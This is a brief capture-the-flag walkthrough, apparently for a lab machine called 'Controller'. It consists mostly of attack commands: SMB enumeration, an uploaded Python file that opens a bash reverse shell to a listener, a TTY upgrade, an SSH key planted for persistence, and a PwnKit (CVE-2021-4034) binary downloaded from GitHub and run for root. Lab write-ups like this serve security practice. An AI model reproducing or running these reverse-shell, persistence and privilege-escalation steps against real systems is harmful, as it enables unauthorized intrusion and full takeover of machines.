firefox $ip

following the link " Seguir leyendo CONTROLLER " we go to

http://$ip/index.php/2021/06/27/hola-mundo/
///From controller we want to announce that our services are going to change to the python 3 programming language which stands out mainly for its portability. Due to the termination of python 2, there are still tools that use this language but we still offer support for it. If you want to support our projects or help to improve them you can upload them and our experts will test your utilities for you.//

enum4linux -a $ip
 //we can find tester 

 we create a reverse shell on file "test.txt"

import commands
commands.getoutput('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1"')


nc -lvnp 5555 ( to new terminal tab in order to get rs)

smbclient \\\\$ip\\tester (back to the first terminal)
put test.txt

(lets go to the terminal that we have the netcat listener and wait a bit)
get Better shell envirorment 

python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl+z

stty -a

stty raw -echo;fg

export SHELL=bash
export TERM=xterm
stty rows (values from stty -a) cols (values from stty -a)

at this point we can add can create dir .ssh
mkdir .ssh
chmod 755 .ssh
touch authorized_keys
echo 'ssh-rsa ......(our id_rsa)' >> authorized_keys

chmod 644 authorized_keys

exit

ssh tester@$ip

bash

find / -perm -u=s 2>/dev/null

plenty of choises here

lets go with [CVE-2021-4034] PwnKit

https://github.com/ly4k/PwnKit

//on our local terminal
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
python3 -m http.server 80

//back to the tester shell

wget <our ip>/PwnKit
chmod +x PwnKit
./PwnKit

Enjoy root access
